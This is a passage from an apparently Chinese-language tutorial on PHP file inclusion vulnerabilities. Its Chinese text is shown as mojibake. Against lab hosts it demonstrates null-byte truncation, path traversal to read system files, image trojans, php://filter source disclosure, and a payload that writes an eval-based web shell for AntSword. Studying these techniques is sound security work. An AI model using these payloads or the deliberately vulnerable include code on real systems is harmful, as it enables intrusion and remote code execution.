class="line-numbers-rows"><span></span></span></code></pre></blockquote><h3 id="2-3-2-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#2-3-2-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="2.3.2 è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>2.3.2 è¿œç¨‹æ–‡ä»¶åŒ…å«</h3><blockquote><h4 id="EX-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#EX-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="EX:è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>EX:è¿œç¨‹æ–‡ä»¶åŒ…å«</h4><p>è¿œç¨‹æ–‡ä»¶åŒ…å«å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡http(s)æˆ–è€…ftpç­‰æ–¹å¼ï¼Œè¿œç¨‹åŠ è½½æ–‡ä»¶ã€‚</p><ul><li>å½“allow_url_include=0ff  ã€åŒ…å«ä¸æˆåŠŸã€‘</li></ul><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.24.15.png" style="zoom:75%;"><ul><li>å½“allow_url_include=On</li></ul><p>HTTP:</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.26.00.png" style="zoom:45%;"><p>FTPï¼š</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.28.30.png" style="zoom:55%;"></blockquote><h2 id="2-4-PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠç‰¹ç‚¹"><a href="#2-4-PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠç‰¹ç‚¹" class="headerlink" title="2.4 PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠç‰¹ç‚¹"></a>2.4 PHPæ–‡ä»¶åŒ…å«æ¼æ´åŸç†åŠç‰¹ç‚¹</h2><h3 id="2-4-1-æ¼æ´åŸç†"><a href="#2-4-1-æ¼æ´åŸç†" class="headerlink" title="2.4.1 æ¼æ´åŸç†"></a>2.4.1 æ¼æ´åŸç†</h3><p> PHPæ–‡ä»¶åŒ…å«æ˜¯ç¨‹åºè®¾è®¡çš„åŸºç¡€åŠŸèƒ½ä¹‹ä¸€ï¼Œèƒ½å¤Ÿå‡å°‘ä»£ç é‡ï¼Œæä¾›å¼€å‘æ•ˆç‡ã€‚ä½†æ˜¯ä½¿ç”¨æ–‡ä»¶åŒ…å«åŠŸèƒ½æ—¶ï¼Œæœ‰ç±»ä¼¼äºä»¥ä¸Šæµ‹è¯•ä»£ç çš„è®¾è®¡ï¼Œå®ç°äº†<code>åŠ¨æ€åŒ…å«</code>ï¼Œå°±æœ‰äº§ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´çš„é£é™©ã€‚å¦‚æœå®ç°åŠ¨æ€åŒ…å«çš„å‚æ•°ï¼ŒWebåº”ç”¨æ²¡æœ‰è¿›è¡Œä¸¥æ ¼å‡€åŒ–ï¼Œå®¢æˆ·ç«¯ç”¨æˆ·å¯ä»¥å½±å“æˆ–æ§åˆ¶æ–‡ä»¶åŒ…å«çš„è·¯å¾„ï¼Œå°±ä¼šäº§ç”Ÿæ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><h3 id="2-4-2-ç‰¹ç‚¹-æ¼æ´åˆ©ç”¨"><a href="#2-4-2-ç‰¹ç‚¹-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.4.2 ç‰¹ç‚¹(æ¼æ´åˆ©ç”¨)"></a>2.4.2 ç‰¹ç‚¹(æ¼æ´åˆ©ç”¨)</h3><p>PHPæä¾›çš„æ–‡ä»¶åŒ…å«åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>@æ— è§†æ–‡ä»¶æ‰©å±•åï¼šè¯»å–æ–‡ä»¶åŒ…å«æ–‡ä»¶æ—¶ï¼ŒPHPä¼šè¯»å–æ–‡ä»¶çš„æºç ï¼ŒåŒ…æ‹¬å›¾ç‰‡æ–‡ä»¶ã€‚</li></ul><p>å°è¯•åŒ…å«å›¾ç‰‡ï¼Œè¿æ¥ä¸º:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.16.132.138/fileInclude/fileinclude.php?path<span class="token operator">=</span>smile.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬å‘ç°æ‰“å¼€å›¾ç‰‡ä¸æ˜¯å›¾åƒï¼Œè€Œæ˜¯å›¾ç‰‡çš„æºç ã€‚</p><ul><li>@æ— æ¡ä»¶è§£æPHPä»£ç </li></ul><p>æ–‡ä»¶åŒ…å«åœ¨è¯»å–æ–‡ä»¶æºç çš„åŒæ—¶ï¼Œå¦‚æœé‡åˆ°ç¬¦åˆPHPè¯­æ³•è§„èŒƒçš„ä»£ç ï¼Œå°±ä¼šæ— æ¡ä»¶æ‰§è¡Œã€‚</p><p>ä¾‹å¦‚ï¼Œå°†info.phpçš„åç¼€åæ”¹æˆinfo.rarï¼Œä¾ç„¶èƒ½å¤Ÿæ˜¾ç¤ºphpinfo() ä¿¡æ¯ã€‚</p><p>è¿™åŒæ—¶ä¹Ÿä¸ºå›¾ç‰‡æœ¨é©¬æä¾›äº†ä¸€ç§åˆ©ç”¨æ–¹æ³•ã€‚</p><blockquote><h4 id="EXï¼šåŒ…å«å›¾ç‰‡æœ¨é©¬"><a href="#EXï¼šåŒ…å«å›¾ç‰‡æœ¨é©¬" class="headerlink" title="EXï¼šåŒ…å«å›¾ç‰‡æœ¨é©¬"></a>EXï¼šåŒ…å«å›¾ç‰‡æœ¨é©¬</h4><p>æœªå†™å…¥phpä»£ç ï¼ŒäºŒè¿›åˆ¶å½¢å¼æ‰“å¼€ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.38.01.png" style="zoom:75%;"><p>é€šè¿‡ä¿®æ”¹å›¾ç‰‡exifä¿¡æ¯æ’å…¥phpä»£ç ï¼Œåˆ¶ä½œæ¶æ„æœ¨é©¬ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.39.08.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-08%20%E4%B8%8A%E5%8D%8810.39.21.png" style="zoom:75%;"><p>åŒ…å«å¹¶æ‰§è¡Œäº†å…¶ä¸­çš„PHPä»£ç ã€‚âœ…</p></blockquote><h2 id="2-5-ç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡-CVE-2006-7243"><a href="#2-5-ç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡-CVE-2006-7243" class="headerlink" title="2.5 ç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡(CVE-2006-7243)"></a>2.5 ç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡(CVE-2006-7243)</h2><p>ç©ºå­—ç¬¦å®‰å…¨é™åˆ¶ç»•è¿‡ï¼Œæ˜¯PHPå°äº5.3.4ç‰ˆæœ¬çš„ä¸€ä¸ªæ¼æ´ï¼ŒCVEç¼–å·æ˜¯CVE-2006-7243ã€‚è¿™ä¸ªæ¼æ´å°±æ˜¯PHPæ¥æ”¶æ¥è‡ªäºè·¯å¾„åä¸­çš„ç©º(Null)å­—ç¬¦ï¼Œè¿™å¯èƒ½å…è®¸ä¾èµ–äºä¸Šä¸‹æ–‡çš„æ”»å‡»è€…é€šè¿‡åœ¨æ­¤å­—ç¬¦åæ”¾ç½®å®‰å…¨æ–‡ä»¶æ‰©å±•åæ¥ç»•è¿‡é¢„æœŸçš„è®¿é—®é™åˆ¶ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹é—´è®²è¿‡çš„00æˆªæ–­ã€‚00æˆªæ–­æ”»å‡»ä¹Ÿä¼šä½“ç°åœ¨æ–‡ä»¶åŒ…å«ä¸­ã€‚</p><p>Webåº”ç”¨åœ¨è®¾è®¡æ—¶å€™ï¼Œç»å¸¸ä¼šåŒ…å«æ¨¡æ¿æ–‡ä»¶ï¼Œç®€å•ç¨‹åºå¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">include</span> <span class="token variable">$_GET</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?path= [path]"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>âš ï¸ï¼šPHPç‰ˆæœ¬è¦å°äº5.3.4ç‰ˆæœ¬</p><p>âš ï¸ï¼šå…³é—­PHPé­”æœ¯å¼•å·ï¼ˆåœ¨ GPCæ•°æ®<code>" '</code>ä¹‹å‰æ·»åŠ <code>\</code>è‡ªåŠ¨è½¬è¯‘ï¼Œâš ï¸ï¼šé«˜ç‰ˆæœ¬çš„PHPå·²ç»åˆ é™¤è¿™ä¸ªåŠŸèƒ½ äº†ã€‚ï¼‰</p><p>phpç›¸åº”ç‰ˆæœ¬çš„é…ç½®æ–‡ä»¶ï¼Œ æœç´¢ magic_quotes_gpc  æ”¹ä¸º Off é‡å¯æœåŠ¡ã€‚</p><blockquote><h4 id="EXï¼šç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡"><a href="#EXï¼šç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡" class="headerlink" title="EXï¼šç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡"></a>EXï¼šç©ºå­—ç¬¦å®‰å…¨ç»•è¿‡</h4><p>1ã€åˆ›å»ºæ¼æ´æ–‡ä»¶index.php</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.39.38.png" style="zoom:55%;"><p> 2ã€æµ‹è¯•å…¶æ­£å¸¸åŠŸèƒ½</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.40.19.png" style="zoom:35%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.41.50.png" style="zoom:55%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/include/00/?path<span class="token operator">=</span>hello.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ã€åˆ©ç”¨00æˆªæ–­åŒ…å«phpå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.42.55.png" style="zoom:55%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>/phpinfo.jpg<span class="token punctuation">\</span><span class="token number">0</span>.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœªå…³é—­é­”æœ¯å¼•å·æ—¶ä¸æˆåŠŸï¼Œæ·»åŠ äº†åæ–œæ è½¬ä¹‰ç¬¦å·ã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.46.31.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.48.17.png" style="zoom:75%;"><p>4ã€åŒ…å«å›¾ç‰‡æœ¨é©¬</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%885.49.11.png" style="zoom:75%;"><p>åŒ…å«å›¾ç‰‡æœ¨é©¬æ—¶ä¸æˆåŠŸï¼Œphpä»£ç æ²¡æœ‰è¢«æ‰§è¡Œã€‚</p><p>ä½†æ˜¯åˆ‡æ¢å›5.4.45ç‰ˆæœ¬æ—¶å¯ä»¥æ˜¾ç¤ºã€‚</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.16.00.png" style="zoom:75%;"><p>åº”è¯¥æ˜¯PHPç‰ˆæœ¬çš„åŸå› ã€‚</p><p>æ³¨æ„ï¼šé«˜ç‰ˆæœ¬GPCæ•°æ®æ²¡æœ‰é­”æœ¯å¼•å·çš„å½±å“ã€‚</p></blockquote><h1 id="ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨"><a href="#ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨" class="headerlink" title="ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨"></a>ä¸‰ã€æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨</h1><h2 id="3-1-è¯»å–æ•æ„Ÿæ–‡ä»¶"><a href="#3-1-è¯»å–æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="3.1 è¯»å–æ•æ„Ÿæ–‡ä»¶"></a>3.1 è¯»å–æ•æ„Ÿæ–‡ä»¶</h2><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–ä»»æ„æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„æ—¶å€™æœ‰åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>1ï¼‰ç›®æ ‡ä¸»æœºæ–‡ä»¶å­˜åœ¨(ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„ï¼Œç»å¯¹è·¯å¾„ï¼Œç›¸å¯¹è·¯å¾„)</li><li>2ï¼‰å…·æœ‰æ–‡ä»¶å¯è¯»æƒé™</li></ul><p>ä¾‹å¦‚ï¼šè¯»å–æœ¬åœ°hostçš„æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?path<span class="token operator">=</span>c:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts<span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯¹äºlinuxé€€åˆ°è·Ÿç›®å½•ï¼Œå¯¹äºwindowsé€€åˆ°å½“å‰è„šæœ¬æ‰€åœ¨ç›˜ç¬¦çš„æ ¹ç›®å½•ã€‚</p><blockquote><h4 id="EX-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ•æ„Ÿæ–‡ä»¶"><a href="#EX-åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="EX:åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ•æ„Ÿæ–‡ä»¶"></a>EX:åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–æ•æ„Ÿæ–‡ä»¶</h4><p>1ã€æ¼æ´ç¨‹åº</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token variable">$path</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h1&gt;This is includehole.php&lt;/h1&gt;"</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2ã€è¯»å–æ•æ„Ÿæ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.08.59.png" style="zoom:75%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.10.03.png" style="zoom:75%;"></blockquote><h2 id="3-2-ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬"><a href="#3-2-ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬" class="headerlink" title="3.2 ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬"></a>3.2 ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬</h2><blockquote><h4 id="EX-ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬"><a href="#EX-ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬" class="headerlink" title="EX:ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬"></a>EX:ç›´æ¥åŒ…å«å›¾ç‰‡æœ¨é©¬</h4><p>1ã€å‡†å¤‡å›¾ç‰‡æœ¨é©¬</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.21.09.png" style="zoom:75%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.23.36.png" style="zoom:75%;"><p>2ã€æµ‹è¯•å›¾ç‰‡æœ¨é©¬å¯ç”¨æ€§</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.26.34.png" style="zoom:75%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/include/includehole.php?path<span class="token operator">=</span>phpinfo.jpg<span class="token operator">&amp;</span><span class="token assign-left variable">123</span><span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3ã€ç”¨èšå‰‘è¿æ¥getshell </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/include/includehole.php?path<span class="token operator">=</span>phpinfo.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯†ç ï¼š123</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.28.00.png" style="zoom:45%;"><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.27.32.png" style="zoom:35%;"></blockquote><h2 id="3-3-åŒ…å«æœ¨é©¬å†™Shell"><a href="#3-3-åŒ…å«æœ¨é©¬å†™Shell" class="headerlink" title="3.3 åŒ…å«æœ¨é©¬å†™Shell"></a>3.3 åŒ…å«æœ¨é©¬å†™Shell</h2><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†å¦‚ä¸‹ä»£ç å†™å…¥åˆ°å›¾ç‰‡ä¸­,</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span> <span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php @eval(\$_REQUEST['cmd'])?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¯¥æ®µä»£ç çš„å«ä¹‰æ˜¯ï¼Œåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º[shell. php]çš„æ–‡ä»¶ï¼Œ å†…å®¹ä¸º[<code>&lt;?php @eval(\$_ REQUEST['cmd'])?&gt;</code>]ï¼Œå½“æˆ‘ä»¬ç›´æ¥åŒ…å«å›¾ç‰‡çš„æ—¶å€™ï¼Œè¿™æ®µä»£ç å°±ä¼šè¢«æ‰§è¡Œã€‚</p></blockquote><blockquote><h4 id="EXï¼šåŒ…å«æœ¨é©¬å†™shell"><a href="#EXï¼šåŒ…å«æœ¨é©¬å†™shell" class="headerlink" title="EXï¼šåŒ…å«æœ¨é©¬å†™shell"></a>EXï¼šåŒ…å«æœ¨é©¬å†™shell</h4><p>1ã€å‡†å¤‡å›¾ç‰‡æœ¨é©¬</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.40.33.png" style="zoom:45%;"><p>2ã€åŒ…å«å›¾ç‰‡æœ¨é©¬</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.43.07.png" style="zoom:75%;"><p>3ã€è®¿é—®shell.php</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.43.28.png" style="zoom:75%;"><p>4ã€ç”¨èšå‰‘è¿æ¥</p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%888.45.18.png" style="zoom:55%;"></blockquote><h2 id="3-4-PHPå°è£…åè®®ï¼ˆä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ï¼‰"><a href="#3-4-PHPå°è£…åè®®ï¼ˆä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ï¼‰" class="headerlink" title="3.4 PHPå°è£…åè®®ï¼ˆä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ï¼‰"></a>3.4 PHPå°è£…åè®®ï¼ˆä¹Ÿæ˜¯æ¼æ´åˆ©ç”¨ï¼‰</h2><p>âš ï¸ï¼šå¼€å¯ alow_url_include é€‰é¡¹ï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰ï¼Œå¼€å¯ alow_url_fopen ï¼ˆæœ¬åœ°phpä¼ªåè®®æ–‡ä»¶åŒ…å«ï¼‰é€‰é¡¹ã€‚</p><h3 id="3-4-1-PHPä¼ªåè®®ï¼ˆfile-ï¼‰åŒ…å«æœ¬åœ°æ–‡ä»¶"><a href="#3-4-1-PHPä¼ªåè®®ï¼ˆfile-ï¼‰åŒ…å«æœ¬åœ°æ–‡ä»¶" class="headerlink" title="3.4.1 PHPä¼ªåè®®ï¼ˆfile://ï¼‰åŒ…å«æœ¬åœ°æ–‡ä»¶"></a>3.4.1 PHPä¼ªåè®®ï¼ˆfile://ï¼‰åŒ…å«æœ¬åœ°æ–‡ä»¶</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨phpçš„fileåè®®è®¿é—®æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶ï¼Œæäº¤å‚æ•°:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?path<span class="token operator">=</span>file://C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EX-åˆ©ç”¨file-åè®®è®¿é—®æœ¬åœ°æ–‡ä»¶"><a href="#EX-åˆ©ç”¨file-åè®®è®¿é—®æœ¬åœ°æ–‡ä»¶" class="headerlink" title="EX:åˆ©ç”¨file://åè®®è®¿é—®æœ¬åœ°æ–‡ä»¶"></a>EX:åˆ©ç”¨file://åè®®è®¿é—®æœ¬åœ°æ–‡ä»¶</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/include/includehole.php?path<span class="token operator">=</span>file://C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts âœ…http://192.168.33.4/include/includehole.php?path<span class="token operator">=</span>file://<span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span><span class="token punctuation">..</span><span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>drivers<span class="token punctuation">\</span>etc<span class="token punctuation">\</span>hosts âŒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%889.08.39.png" style="zoom:75%;"></blockquote><h3 id="3-4-2-PHPå°è£…åè®®â€“ä¼ è¾“PHPæ–‡ä»¶-php-filter"><a href="#3-4-2-PHPå°è£…åè®®â€“ä¼ è¾“PHPæ–‡ä»¶-php-filter" class="headerlink" title="3.4.2 PHPå°è£…åè®®â€“ä¼ è¾“PHPæ–‡ä»¶(php://filter)"></a>3.4.2 PHPå°è£…åè®®â€“ä¼ è¾“PHPæ–‡ä»¶(php://filter)</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‚æ•°æ¥ä¼ é€ä»»æ„PHPæ–‡ä»¶ï¼Œç„¶åæŠŠå¾—åˆ°çš„æ‰€æœ‰å­—ç¬¦ä¸²base64è§£ç å³å¯ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?path<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>inc.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="EXï¼šåˆ©ç”¨php-ä¼ è¾“PHPæ–‡ä»¶"><a href="#EXï¼šåˆ©ç”¨php-ä¼ è¾“PHPæ–‡ä»¶" class="headerlink" title="EXï¼šåˆ©ç”¨php://ä¼ è¾“PHPæ–‡ä»¶"></a>EXï¼šåˆ©ç”¨php://ä¼ è¾“PHPæ–‡ä»¶</h4><p>1ã€è·å–ç›®æ ‡æ–‡ä»¶çš„base64ç¼–ç </p><img src="/2025/02/10/web-an-quan/wen-jian-bao-han-lou-dong/%E6%88%AA%E5%B1%8F2021-07-12%20%E4%B8%8B%E5%8D%889.16.13.png" style="zoom:75%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/include/includehole.php?path<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2ã€ç”¨BPè§£ç 